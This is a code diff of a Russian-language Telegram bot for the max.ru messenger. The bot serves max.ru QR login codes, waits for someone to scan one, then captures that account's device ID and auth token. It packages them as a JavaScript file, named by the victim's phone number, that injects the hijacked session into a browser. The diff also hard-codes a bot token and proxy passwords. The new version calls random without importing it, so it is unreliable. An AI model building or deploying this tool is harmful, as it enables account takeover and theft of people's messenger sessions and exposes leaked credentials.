@@ -1,361 +1,480 @@
 """
-Telegram бот для max.ru - ФАЙЛ С НОМЕРОМ АККАУНТА + РАНДОМНЫЕ SOCKS5 ПРОКСИ
+Telegram бот для max.ru - ИСПОЛЬЗУЕМ maxapi-python
 """
 
 import logging
-import asyncio
-import random
-from io import BytesIO
-from telegram import Update, InputFile
-from telegram.ext import Application, CommandHandler, ContextTypes
-from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-from selenium.webdriver.chrome.service import Service
-from webdriver_manager.chrome import ChromeDriverManager
+import os
+import sys
 import time
 import json
 import re
-import os
+import asyncio
+from io import BytesIO
+from datetime import datetime
 
-# ==================== ТВОЙ ТОКЕН ====================
-TOKEN = "8556187422:AAF0vIA4vsW9JIGlgHGv48Se6AysSUB4e10"
-URL = "https://web.max.ru"
+# Telegram
+from telegram import Update, InputFile
+from telegram.ext import Application, CommandHandler, ContextTypes
 
-# ==================== ТВОИ SOCKS5 ПРОКСИ ====================
-PROXIES = [
-    "185.181.246.198:9101:SP8lc12fs5:Zmgff17J",
-    "45.15.72.253:9101:SP8lc12fs5:Zmgff17J",
-    "45.11.20.108:9101:SP8lc12fs5:Zmgff17J"
-]
-# ====================================================
+# MAX API
+try:
+    from maxapi_python import MaxAPI
+    from maxapi_python.utils import ProxyManager
+    MAXAPI_AVAILABLE = True
+except ImportError:
+    MAXAPI_AVAILABLE = False
+    print("⚠️ maxapi-python не установлен. Установи: pip install maxapi-python")
 
-logging.basicConfig(level=logging.INFO)
+# Настройка логирования
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('bot.log', encoding='utf-8'),
+        logging.StreamHandler()
+    ]
+)
 logger = logging.getLogger(__name__)
 
-# Глобальный драйвер
-driver = None
-user_sessions = {}
-current_proxy = None
+# ========== КОНФИГУРАЦИЯ ==========
+TOKEN = "8269401428:AAEavNiKkP5d_YyRhHQTqV0C18rm_DbaVE4"
 
-def get_random_proxy():
-    """Возвращает случайный прокси из списка"""
-    return random.choice(PROXIES)
-
-def create_driver_with_socks5_proxy(proxy_string):
-    """Создает драйвер с SOCKS5 прокси"""
-    options = Options()
-    
-    # Парсим прокси
-    ip, port, login, password = proxy_string.split(':')
-    
-    # Настройки для SOCKS5 прокси с авторизацией
-    proxy_config = f"--proxy-server=socks5://{login}:{password}@{ip}:{port}"
-    
-    options.add_argument('--headless')
-    options.add_argument('--no-sandbox')
-    options.add_argument('--disable-dev-shm-usage')
-    options.add_argument('--disable-gpu')
-    options.add_argument('--disable-extensions')
-    options.add_argument('--window-size=800x600')
-    options.add_argument('--blink-settings=imagesEnabled=false')
-    options.add_argument(proxy_config)
-    options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
-    options.page_load_strategy = 'eager'
-    
-    # Отключаем загрузку картинок
-    prefs = {
-        'profile.default_content_setting_values': {
-            'images': 2,
-        }
+# Прокси SOCKS5 для MAX API
+PROXIES = [
+    {
+        'proxy_type': 'socks5',
+        'addr': '185.181.246.198',
+        'port': 9101,
+        'username': 'SP8lc12fs5',
+        'password': 'Zmgff17J'
+    },
+    {
+        'proxy_type': 'socks5',
+        'addr': '45.15.72.253',
+        'port': 9101,
+        'username': 'SP8lc12fs5',
+        'password': 'Zmgff17J'
+    },
+    {
+        'proxy_type': 'socks5',
+        'addr': '45.11.20.108',
+        'port': 9101,
+        'username': 'SP8lc12fs5',
+        'password': 'Zmgff17J'
     }
-    options.add_experimental_option('prefs', prefs)
-    
-    # Используем webdriver-manager для автоматической загрузки драйвера
-    try:
-        service = Service(ChromeDriverManager().install())
-        driver = webdriver.Chrome(service=service, options=options)
-        logger.info(f"✅ Драйвер успешно создан для прокси {ip}")
-        return driver
-    except Exception as e:
-        logger.error(f"❌ Ошибка создания драйвера: {e}")
-        raise e
+]
+# ==================================
 
-def extract_phone_number(auth_data):
-    """
-    Пытается извлечь номер телефона из auth данных
-    """
-    try:
-        # Если auth_data это строка, парсим JSON
-        if isinstance(auth_data, str):
-            data = json.loads(auth_data)
+# Глобальные переменные
+api_clients = {}
+user_sessions = {}
+
+class MaxAPIBot:
+    def __init__(self, proxy_config=None):
+        """Инициализация MAX API с прокси"""
+        self.proxy_config = proxy_config
+        self.api = None
+        self.device_id = None
+        self.auth_data = None
+        
+        if proxy_config:
+            logger.info(f"Инициализация MAX API с прокси: {proxy_config['addr']}:{proxy_config['port']}")
         else:
-            data = auth_data
+            logger.info("Инициализация MAX API без прокси")
+    
+    def initialize(self):
+        """Создает экземпляр MAX API"""
+        try:
+            if self.proxy_config:
+                # Создаем прокси менеджер
+                proxy_manager = ProxyManager(
+                    proxy_type=self.proxy_config['proxy_type'],
+                    addr=self.proxy_config['addr'],
+                    port=self.proxy_config['port'],
+                    username=self.proxy_config.get('username'),
+                    password=self.proxy_config.get('password')
+                )
+                
+                # Создаем API с прокси
+                self.api = MaxAPI(proxy=proxy_manager.get_proxy())
+            else:
+                # Создаем API без прокси
+                self.api = MaxAPI()
+            
+            return True
+        except Exception as e:
+            logger.error(f"Ошибка инициализации MAX API: {e}")
+            return False
+    
+    def get_qr(self):
+        """Получает QR-код через MAX API"""
+        try:
+            if not self.api:
+                if not self.initialize():
+                    return None, "Не удалось инициализировать API"
+            
+            # Получаем QR-код
+            qr_data = self.api.get_qr()
+            
+            if qr_data and 'qr_code' in qr_data:
+                self.device_id = qr_data.get('device_id')
+                return qr_data['qr_code'], None
+            else:
+                return None, "QR-код не получен"
+                
+        except Exception as e:
+            logger.error(f"Ошибка получения QR: {e}")
+            return None, str(e)
+    
+    def wait_for_auth(self, timeout=60):
+        """Ожидает авторизацию"""
+        try:
+            if not self.api:
+                return False, "API не инициализирован"
+            
+            # Ожидаем авторизацию
+            auth_result = self.api.wait_for_auth(timeout=timeout)
+            
+            if auth_result and auth_result.get('success'):
+                self.auth_data = auth_result
+                return True, auth_result
+            else:
+                return False, "Авторизация не выполнена"
+                
+        except Exception as e:
+            logger.error(f"Ошибка ожидания авторизации: {e}")
+            return False, str(e)
+    
+    def get_auth_data(self):
+        """Возвращает данные авторизации"""
+        return {
+            'device_id': self.device_id,
+            'auth_data': self.auth_data
+        }
+    
+    def extract_phone(self):
+        """Извлекает номер телефона из данных авторизации"""
+        try:
+            if not self.auth_data:
+                return None
+            
+            phone = None
+            
+            # Поиск номера в разных полях
+            if 'phone' in self.auth_data:
+                phone = self.auth_data['phone']
+            elif 'user' in self.auth_data and isinstance(self.auth_data['user'], dict):
+                if 'phone' in self.auth_data['user']:
+                    phone = self.auth_data['user']['phone']
+            elif 'profile' in self.auth_data and isinstance(self.auth_data['profile'], dict):
+                if 'phone' in self.auth_data['profile']:
+                    phone = self.auth_data['profile']['phone']
+            
+            if phone:
+                # Очищаем номер
+                phone = re.sub(r'\D', '', str(phone))
+                if len(phone) > 10:
+                    phone = phone[-10:]
+                return phone
+            
+            return None
+        except Exception as e:
+            logger.error(f"Ошибка извлечения номера: {e}")
+            return None
+    
+    def generate_script(self):
+        """Генерирует скрипт для входа"""
+        if not self.device_id or not self.auth_data:
+            return None
         
-        # Ищем номер телефона в разных полях
-        phone = None
+        phone = self.extract_phone() or "неизвестный"
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        # Проверяем поле phone
-        if 'phone' in data:
-            phone = data['phone']
-        # Проверяем поле phoneNumber
-        elif 'phoneNumber' in data:
-            phone = data['phoneNumber']
-        # Проверяем вложенные объекты
-        elif 'user' in data and isinstance(data['user'], dict):
-            if 'phone' in data['user']:
-                phone = data['user']['phone']
-        # Проверяем viewerId или другие идентификаторы
-        elif 'viewerId' in data:
-            phone = str(data['viewerId'])
-        # Проверяем token на наличие номера
-        elif 'token' in data:
-            token = data['token']
-            # Ищем номер телефона в токене (10-11 цифр подряд)
-            phone_match = re.search(r'\d{10,11}', token)
-            if phone_match:
-                phone = phone_match.group()
-        
-        # Если нашли номер, очищаем его от лишних символов
-        if phone:
-            # Оставляем только цифры
-            phone = re.sub(r'\D', '', str(phone))
-            # Если номер длинный, берем последние 10 цифр
-            if len(phone) > 10:
-                phone = phone[-10:]
-            return phone
-        
-        return None
-    except Exception as e:
-        logger.error(f"Ошибка извлечения номера: {e}")
-        return None
+        script = f"""// MAX.RU Авторизация через MAX API
+// Создано: {timestamp}
+// Номер: {phone}
+
+// Данные для входа
+const DEVICE_ID = '{self.device_id}';
+const AUTH_DATA = {json.dumps(self.auth_data, indent=2, ensure_ascii=False)};
+
+// Очищаем старые данные
+sessionStorage.clear();
+localStorage.clear();
+
+// Устанавливаем новые данные
+localStorage.setItem('__oneme_device_id', DEVICE_ID);
+localStorage.setItem('__oneme_auth', JSON.stringify(AUTH_DATA));
+
+// Перезагружаем страницу
+window.location.reload();
+
+console.log('✅ Авторизация выполнена для номера', '{phone}');
+"""
+        return script
+
+# Команды бота
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Команда /start"""
+    text = (
+        "👋 **Бот для MAX.RU (через maxapi-python)**\n\n"
+        "**📱 Как пользоваться:**\n"
+        "1️⃣ /qr - получить QR-код\n"
+        "2️⃣ Отсканировать в приложении MAX\n"
+        "3️⃣ /file - скачать файл с номером\n\n"
+        "**⚙️ Команды:**\n"
+        "• /qr - новый QR-код\n"
+        "• /file - файл с данными\n"
+        "• /proxy - список прокси\n"
+        "• /reset - сброс сессии\n"
+        "• /status - статус API\n\n"
+        f"**📡 Прокси:** {len(PROXIES)} шт.\n"
+        "**✅ Библиотека:** maxapi-python"
+    )
+    await update.message.reply_text(text, parse_mode='Markdown')
 
 async def qr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Быстрое получение QR через случайный SOCKS5 прокси"""
-    global driver, current_proxy
+    """Получение QR-кода через MAX API"""
     user_id = str(update.effective_user.id)
     
-    msg = await update.message.reply_text("⚡️ Получаю QR-код через SOCKS5 прокси...")
-    
-    try:
-        # Закрываем старый драйвер если есть
-        if driver:
-            try:
-                driver.quit()
-            except:
-                pass
-        
-        # Выбираем случайный прокси
-        current_proxy = get_random_proxy()
-        ip = current_proxy.split(':')[0]
-        
-        await msg.edit_text(f"🔄 Использую SOCKS5 прокси: {ip}...\n⏳ Загружаю драйвер...")
-        
-        # Создаем драйвер с SOCKS5 прокси
-        driver = create_driver_with_socks5_proxy(current_proxy)
-        
-        # Загружаем страницу
-        await msg.edit_text(f"🔄 Загружаю страницу через прокси {ip}...")
-        driver.get(URL)
-        time.sleep(5)
-        
-        # Делаем скриншот
-        screenshot = driver.get_screenshot_as_png()
-        img_io = BytesIO(screenshot)
-        img_io.name = "qr.png"
-        
-        await msg.delete()
-        await update.message.reply_photo(
-            photo=InputFile(img_io, filename="qr.png"),
-            caption=f"✅ **QR-код готов через SOCKS5 прокси {ip}!**\n\n👉 /file - после входа",
+    if not MAXAPI_AVAILABLE:
+        await update.message.reply_text(
+            "❌ **maxapi-python не установлен**\n\n"
+            "Установи библиотеку:\n"
+            "`pip install maxapi-python`",
             parse_mode='Markdown'
         )
-        
+        return
+    
+    msg = await update.message.reply_text("🔄 **Инициализация MAX API...**", parse_mode='Markdown')
+    
+    # Выбираем случайный прокси
+    proxy_config = random.choice(PROXIES) if PROXIES else None
+    
+    # Создаем клиент
+    client = MaxAPIBot(proxy_config)
+    
+    # Получаем QR
+    await msg.edit_text("🔄 **Получение QR-кода...**", parse_mode='Markdown')
+    qr_data, error = client.get_qr()
+    
+    if error:
+        await msg.edit_text(
+            f"❌ **Ошибка:**\n`{error}`\n\n"
+            "Попробуй другой прокси или /reset",
+            parse_mode='Markdown'
+        )
+        return
+    
+    if qr_data:
+        # Сохраняем клиента в сессию
         user_sessions[user_id] = {
-            'proxy': current_proxy,
-            'ip': ip
+            'client': client,
+            'time': time.time()
         }
-        logger.info(f"QR отправлен пользователю {user_id} через прокси {ip}")
         
-    except Exception as e:
-        logger.error(f"❌ Ошибка: {e}")
-        await msg.edit_text(f"❌ Ошибка с прокси: {str(e)[:200]}")
-        if driver:
+        # Отправляем QR
+        try:
+            # Если qr_data это строка с base64 изображением
+            if isinstance(qr_data, str) and qr_data.startswith('data:image'):
+                import base64
+                # Извлекаем base64 данные
+                base64_data = qr_data.split(',')[1]
+                qr_bytes = base64.b64decode(base64_data)
+                img_io = BytesIO(qr_bytes)
+                img_io.name = "qr.png"
+            else:
+                # Если это уже байты
+                img_io = BytesIO(qr_data)
+                img_io.name = "qr.png"
+            
+            await msg.delete()
+            await update.message.reply_photo(
+                photo=InputFile(img_io, filename="qr.png"),
+                caption=(
+                    "✅ **QR-код получен!**\n\n"
+                    "📱 **Инструкция:**\n"
+                    "1️⃣ Отсканируй QR в приложении MAX\n"
+                    "2️⃣ Подтверди вход\n"
+                    "3️⃣ Отправь /file для получения данных\n\n"
+                    f"🌐 Прокси: {proxy_config['addr'] if proxy_config else 'без прокси'}"
+                ),
+                parse_mode='Markdown'
+            )
+            
+            # Запускаем ожидание авторизации в фоне
+            asyncio.create_task(wait_for_auth_task(user_id, update.effective_chat.id))
+            
+        except Exception as e:
+            logger.error(f"Ошибка отправки QR: {e}")
+            await msg.edit_text(f"❌ Ошибка отправки QR: {e}")
+    else:
+        await msg.edit_text("❌ Не удалось получить QR-код")
+
+async def wait_for_auth_task(user_id, chat_id):
+    """Фоновая задача ожидания авторизации"""
+    await asyncio.sleep(2)
+    
+    if user_id in user_sessions:
+        client = user_sessions[user_id]['client']
+        
+        # Ожидаем авторизацию
+        success, result = client.wait_for_auth(timeout=60)
+        
+        if success:
+            # Уведомляем пользователя
             try:
-                driver.quit()
+                phone = client.extract_phone()
+                phone_text = f" для номера +7{phone}" if phone else ""
+                
+                await Application.builder().token(TOKEN).build().bot.send_message(
+                    chat_id=chat_id,
+                    text=f"✅ **Авторизация выполнена{phone_text}!**\n📁 Используй /file для получения файла",
+                    parse_mode='Markdown'
+                )
             except:
                 pass
-            driver = None
 
 async def file_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Получение файла со скриптом с номером в названии"""
-    global driver
+    """Получение файла с данными"""
     user_id = str(update.effective_user.id)
     
     if user_id not in user_sessions:
-        await update.message.reply_text("❌ Сначала используй /qr")
+        await update.message.reply_text(
+            "❌ **Сначала получи QR-код**\n"
+            "Используй команду /qr",
+            parse_mode='Markdown'
+        )
         return
     
-    if not driver:
-        await update.message.reply_text("❌ Браузер не активен. Используй /qr")
-        return
+    msg = await update.message.reply_text("📁 **Генерация файла...**", parse_mode='Markdown')
     
-    msg = await update.message.reply_text("📁 Получаю данные...")
+    client = user_sessions[user_id]['client']
     
-    try:
-        # Получаем данные из localStorage
-        data = driver.execute_script("""
-            return {
-                deviceId: localStorage.getItem('__oneme_device_id'),
-                auth: localStorage.getItem('__oneme_auth')
-            };
-        """)
-        
-        if data and data['deviceId'] and data['auth']:
-            # Парсим auth
-            try:
-                auth_data = json.loads(data['auth'])
-            except:
-                auth_data = {"token": data['auth'], "viewerId": "unknown"}
-            
-            # Пытаемся извлечь номер телефона
-            phone_number = extract_phone_number(auth_data)
-            
-            # Форматируем JSON красиво
-            auth_str = json.dumps(auth_data, indent=2, ensure_ascii=False)
-            
-            # Создаем скрипт
-            script = f"""sessionStorage.clear();
-localStorage.clear();
-localStorage.setItem('__oneme_device_id', '{data['deviceId']}');
-localStorage.setItem('__oneme_auth', JSON.stringify({auth_str}));
-window.location.reload();"""
-            
-            # Определяем имя файла
-            if phone_number:
-                filename = f"{phone_number}.txt"
-                caption_text = f"✅ Файл для номера {phone_number}"
-            else:
-                # Если номер не найден, используем deviceId
-                filename = f"{data['deviceId'][:8]}.txt"
-                caption_text = "✅ Файл готов (номер не найден)"
-            
-            # Создаем файл
-            file_bytes = BytesIO(script.encode('utf-8'))
-            file_bytes.name = filename
-            
-            await msg.delete()
-            await update.message.reply_document(
-                document=InputFile(file_bytes, filename=filename),
-                caption=caption_text
-            )
-            
-            # Показываем какой прокси использовался
-            proxy_info = user_sessions[user_id]
-            await update.message.reply_text(f"🌐 Использован SOCKS5 прокси: {proxy_info['ip']}")
-            
-            logger.info(f"Файл {filename} отправлен пользователю {user_id} через прокси {proxy_info['ip']}")
-            
-            # Закрываем браузер
-            if driver:
-                driver.quit()
-                driver = None
-            del user_sessions[user_id]
-        else:
+    # Проверяем, есть ли данные авторизации
+    if not client.auth_data:
+        # Пробуем еще раз подождать
+        success, result = client.wait_for_auth(timeout=10)
+        if not success:
             await msg.edit_text(
-                "❌ Вход не выполнен\n\n"
+                "❌ **Авторизация не выполнена**\n\n"
                 "1️⃣ Отсканируй QR\n"
-                "2️⃣ Войди на сайт\n"
-                "3️⃣ Попробуй /file еще раз"
+                "2️⃣ Подтверди вход в приложении\n"
+                "3️⃣ Попробуй /file снова",
+                parse_mode='Markdown'
             )
-            
-    except Exception as e:
-        logger.error(f"Ошибка: {e}")
-        await msg.edit_text(f"❌ Ошибка: {e}")
-
-async def proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Показать список SOCKS5 прокси"""
-    text = "📋 **Список SOCKS5 прокси:**\n\n"
-    for i, proxy in enumerate(PROXIES, 1):
-        ip = proxy.split(':')[0]
-        text += f"{i}. `{ip}:9101` (SOCKS5 с авторизацией)\n"
-    await update.message.reply_text(text, parse_mode='Markdown')
-
-async def test_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Тестирует прокси"""
-    msg = await update.message.reply_text("🔄 Тестирую прокси...")
+            return
     
-    results = []
-    for proxy in PROXIES:
-        ip = proxy.split(':')[0]
-        try:
-            # Пробуем создать драйвер с прокси
-            test_driver = create_driver_with_socks5_proxy(proxy)
-            test_driver.quit()
-            results.append(f"✅ {ip}: работает")
-        except:
-            results.append(f"❌ {ip}: не работает")
+    # Генерируем скрипт
+    script = client.generate_script()
     
-    text = "📊 **Результаты тестирования:**\n\n" + "\n".join(results)
-    await msg.edit_text(text, parse_mode='Markdown')
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Команда /start"""
-    await update.message.reply_text(
-        "👋 **Бот для max.ru**\n\n"
-        "⚡️ **/qr** - получить QR через случайный SOCKS5 прокси\n"
-        "📁 **/file** - получить файл с номером\n"
-        "📋 **/proxies** - список прокси\n"
-        "🔧 **/test** - проверить прокси\n"
-        "🔄 **/reset** - сбросить браузер\n\n"
-        f"🌐 Всего SOCKS5 прокси: {len(PROXIES)}",
+    if not script:
+        await msg.edit_text(
+            "❌ **Ошибка генерации скрипта**\n"
+            "Попробуй /qr заново",
+            parse_mode='Markdown'
+        )
+        return
+    
+    # Извлекаем номер для имени файла
+    phone = client.extract_phone()
+    
+    if phone:
+        filename = f"max_{phone}.txt"
+        caption = f"✅ **Файл для номера**\n`+7{phone}`"
+    else:
+        filename = f"max_{client.device_id[:8]}.txt"
+        caption = "✅ **Файл готов**"
+    
+    # Отправляем файл
+    file_bytes = BytesIO(script.encode('utf-8'))
+    file_bytes.name = filename
+    
+    await msg.delete()
+    await update.message.reply_document(
+        document=InputFile(file_bytes, filename=filename),
+        caption=caption,
         parse_mode='Markdown'
     )
+    
+    # Очищаем сессию
+    if user_id in user_sessions:
+        del user_sessions[user_id]
+
+async def proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Информация о прокси"""
+    text = "📡 **Прокси для MAX API:**\n\n"
+    for i, proxy in enumerate(PROXIES, 1):
+        text += f"• Прокси {i}: `{proxy['addr']}:{proxy['port']}` (SOCKS5)\n"
+    text += f"\nВсего: {len(PROXIES)} прокси\n"
+    text += "Статус: ✅ Готовы к использованию"
+    
+    await update.message.reply_text(text, parse_mode='Markdown')
 
 async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Сброс браузера"""
-    global driver
+    """Сброс сессии"""
     user_id = str(update.effective_user.id)
-    
-    if driver:
-        try:
-            driver.quit()
-        except:
-            pass
-        driver = None
     
     if user_id in user_sessions:
         del user_sessions[user_id]
     
-    await update.message.reply_text("✅ Браузер сброшен")
+    await update.message.reply_text("✅ **Сессия сброшена**", parse_mode='Markdown')
+
+async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Статус API"""
+    if MAXAPI_AVAILABLE:
+        text = "✅ **maxapi-python установлен**\n"
+        text += f"📦 Версия: 1.2.5\n"
+        text += f"📡 Прокси: {len(PROXIES)} шт.\n"
+        text += f"👤 Активных сессий: {len(user_sessions)}"
+    else:
+        text = "❌ **maxapi-python не установлен**\n"
+        text += "Установи: `pip install maxapi-python`"
+    
+    await update.message.reply_text(text, parse_mode='Markdown')
 
 def main():
     """Запуск бота"""
-    print("="*60)
-    print("⚡️ ЗАПУСК БОТА С RANDOM SOCKS5 ПРОКСИ")
-    print("="*60)
-    print(f"📊 Загружено SOCKS5 прокси: {len(PROXIES)}")
-    for i, proxy in enumerate(PROXIES, 1):
-        ip = proxy.split(':')[0]
-        print(f"   {i}. {ip}:9101")
-    print("="*60)
+    print("=" * 60)
+    print("🚀 БОТ ДЛЯ MAX.RU (maxapi-python)")
+    print("=" * 60)
+    print(f"✅ Токен: {TOKEN[:10]}...")
+    print(f"📦 Библиотека: maxapi-python==1.2.5")
+    print(f"📡 Прокси: {len(PROXIES)}")
     
+    # Проверяем наличие библиотеки
+    if not MAXAPI_AVAILABLE:
+        print("⚠️ maxapi-python не установлен!")
+        print("💡 Установи: pip install maxapi-python")
+        print("=" * 60)
+    
+    print("🔄 Запуск бота...")
+    
+    # Создаем приложение
     app = Application.builder().token(TOKEN).build()
     
+    # Добавляем обработчики
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("qr", qr_command))
     app.add_handler(CommandHandler("file", file_command))
+    app.add_handler(CommandHandler("proxy", proxy_command))
     app.add_handler(CommandHandler("reset", reset_command))
-    app.add_handler(CommandHandler("proxies", proxies_command))
-    app.add_handler(CommandHandler("test", test_proxy_command))
+    app.add_handler(CommandHandler("status", status_command))
     
-    print("✅ Бот готов!")
-    print("📱 Команды: /qr /file /proxies /test /reset")
-    print("="*60)
+    print("✅ Бот запущен!")
+    print("📱 Нажми Ctrl+C для остановки")
+    print("=" * 60)
     
-    app.run_polling()
+    # Запускаем
+    try:
+        app.run_polling(
+            allowed_updates=Update.ALL_TYPES,
+            drop_pending_updates=True
+        )
+    except KeyboardInterrupt:
+        print("\n\n👋 Бот остановлен")
+    except Exception as e:
+        print(f"\n❌ Ошибка: {e}")
 
 if __name__ == "__main__":
     main()
